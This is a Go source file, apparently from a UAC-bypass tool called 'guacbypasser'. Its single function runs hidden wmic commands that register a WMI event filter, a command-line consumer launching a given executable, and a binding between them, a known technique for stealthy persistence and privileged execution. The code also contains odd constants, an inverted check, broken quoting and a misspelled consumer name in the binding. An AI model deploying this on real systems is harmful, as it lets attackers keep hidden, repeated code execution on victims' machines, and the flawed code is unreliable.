package guacbypasser

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"syscall"
	"time"
)

func HWND_W32_Method_WMIC(path string) error {
	var cmd *exec.Cmd
	var err error

	var c = __W32_WMIC__{
		Type:   "_wmic",
		Method: "command",
		Scode: [2]uintptr{
			0xcce, 0x0428ec,
		},

		Location: fmt.Sprintf("%s\\_wmic.gUAC", os.Getenv("APPDATA")),
		_K_Wmic:  0x10,
	}

	if len(c.Type)&len(c.Method) == 0 {
	} else {
		log.Printf("[*] You have problem with length of `Type` or `Method`")
	}

	cmd = exec.Command("cmd", "/C",
		fmt.Sprintf(
			"wmic /namespace:'\\\\root\\subscription' PATH __EventFilter CREATE Name='GuacBypassFilter', EventNameSpace='root\\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System''",
		),
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		log.Println(err)
	}

	// Sleep for 5 seconds...
	time.Sleep(5 * 1 * time.Second)

	cmd = exec.Command("cmd", "/C",
		fmt.Sprintf(
			"wmic /namespace:'\\\\root\\subscription' PATH CommandLineEventConsumer CREATE Name='GuacBypassConsumer', ExecutablePath='%s',CommandLineTemplate='%s'",
			path,
			path,
		),
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		log.Println(err)
	}

	// Sleep for 5 seconds...
	time.Sleep(5 * 1 * time.Second)

	cmd = exec.Command("cmd", "/C",
		fmt.Sprintf(
			"wmic /namespace:'\\\\root\\subscription' PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name='GuacBypassFilter'', Consumer='CommandLineEventConsumer.Name='GuacBypassConsomer''",
		),
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		log.Println(err)
	}

	return err
}
